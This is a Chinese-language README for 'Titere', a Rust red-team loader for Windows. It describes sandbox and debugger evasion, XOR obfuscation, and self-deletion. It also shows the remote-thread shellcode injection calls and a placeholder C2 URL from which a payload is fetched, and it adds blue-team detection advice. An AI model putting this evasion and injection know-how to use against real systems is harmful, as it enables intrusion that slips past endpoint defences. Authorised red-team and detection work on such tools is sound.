# Titere - 红队渗透测试工具

一个专为红队渗透测试和红队评估设计的 Rust 工具，集成了多种高级渗透技术。

## 🎯 工具定位

Titere 是一个综合性的红队工具，主要用于：
- 红队渗透测试
- 红队评估
- 安全研究
- 威胁模拟
- 蓝队对抗训练

## ⚠️ 免责声明

**本工具仅用于授权的安全测试、红队评估和安全研究。使用者必须获得目标系统的明确授权，并遵守相关法律法规。作者不承担任何因非法使用而产生的法律责任。**

## 🛠️ 功能特性

### 主程序 (src/main.rs)
- **环境检测**：沙箱检测、虚拟机检测、调试器检测
- **行为伪装**：延迟执行、正常行为模拟、多态代码
- **进程注入**：远程线程注入、内存操作、权限提升
- **数据加密**：XOR加密、Base64编码、数据混淆
- **自清理**：执行后自删除、痕迹清理

### 加密工具 (encrypt_project/src/main.rs)
- **文件加密**：自动检测并加密.bin文件
- **密钥管理**：固定密钥XOR加密
- **批量处理**：支持批量文件处理

## 📋 技术栈

- **语言**：Rust
- **平台**：Windows
- **依赖**：
  - `windows` - Windows API 绑定
  - `reqwest` - HTTP 客户端
  - `sysinfo` - 系统信息获取
  - `base64` - Base64 编码/解码
  - `rand` - 随机数生成

## 🚀 快速开始

### 环境要求
- Windows 操作系统
- Rust 开发环境
- 管理员权限（部分功能需要）

### 编译安装
```bash
# 克隆项目
git clone https://github.com/9Insomnie/TitereV1.0.git
cd Titere

# 编译主程序
cargo build --release

# 编译加密工具
cd encrypt_project
cargo build --release
```

### 使用方法

#### 主程序
```bash
# 直接运行
cargo run

# 或运行编译后的可执行文件
./target/release/loader.exe
```

#### 加密工具
```bash
cd encrypt_project
cargo run
```

## 🔧 配置说明

### 服务器配置
在使用前，请修改 `src/main.rs` 中的服务器地址：
```rust
let url = "http://your-c2-server.com:port/output.bin";
```

### 加密密钥
默认XOR密钥：`[0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x7A, 0x8B]`

## 🎯 红队使用场景

### 1. 初始访问
- 利用环境检测绕过安全防护
- 通过行为伪装避免触发告警
- 实现持久化访问

### 2. 权限提升
- 进程注入技术
- 内存操作
- 权限维持

### 3. 横向移动
- 远程代码执行
- 进程间通信
- 网络传播

### 4. 数据窃取
- 文件加密传输
- 数据混淆
- 隐蔽通信

## 🛡️ 蓝队对抗

### 检测点
1. **沙箱检测行为**
   - 运行时间检测
   - 用户交互检测
   - 环境特征检测

2. **进程注入特征**
   - 远程线程创建
   - 内存分配模式
   - API调用序列

3. **网络通信**
   - 异常HTTP请求
   - 加密数据传输
   - 命令控制通信

### 防护建议
- 部署EDR/EPP解决方案
- 监控进程创建和内存操作
- 网络流量分析
- 行为分析告警

## 📊 技术细节

### 沙箱对抗技术
```rust
// 运行时间检测
fn is_short_uptime() -> bool {
    unsafe { GetTickCount64() < 5 * 60 * 1000 }
}

// 用户输入检测
fn is_no_user_input() -> bool {
    // 检测用户空闲时间
}

// 环境检测
fn is_sandbox_user() -> bool {
    // 检测用户名和计算机名
}
```

### 进程注入技术
```rust
// 远程内存分配
let addr = VirtualAllocEx(h_proc, ...);

// 写入shellcode
WriteProcessMemory(h_proc, addr, ...);

// 创建远程线程
CreateRemoteThread(h_proc, ...);
```

## 🔍 日志分析

### 关键日志
- Windows 事件日志
- 进程创建日志
- 网络连接日志
- 文件操作日志

### 分析工具
- Windows Event Viewer
- Process Monitor
- Wireshark
- Volatility

## 📝 使用建议

### 红队使用
1. **授权测试**：确保获得明确授权
2. **环境隔离**：在隔离环境中测试
3. **日志记录**：详细记录测试过程
4. **报告编写**：生成详细的技术报告

### 安全研究
1. **代码分析**：深入理解技术原理
2. **改进优化**：提出改进建议
3. **知识分享**：在安全社区分享经验

## 🤝 贡献指南

欢迎提交 Issue 和 Pull Request：
- 功能改进
- Bug 修复
- 文档完善
- 新特性开发

## 📄 许可证

本项目仅供安全研究和授权测试使用。

## 📞 联系方式

如有问题或建议，请通过以下方式联系：
- GitHub Issues: [@9Insomnie](https://github.com/9Insomnie)
- 安全社区讨论
- 个人主页: [9Insomnie](https://github.com/9Insomnie)

---

**⚠️ 再次提醒：请确保在授权环境中使用本工具，遵守相关法律法规。** 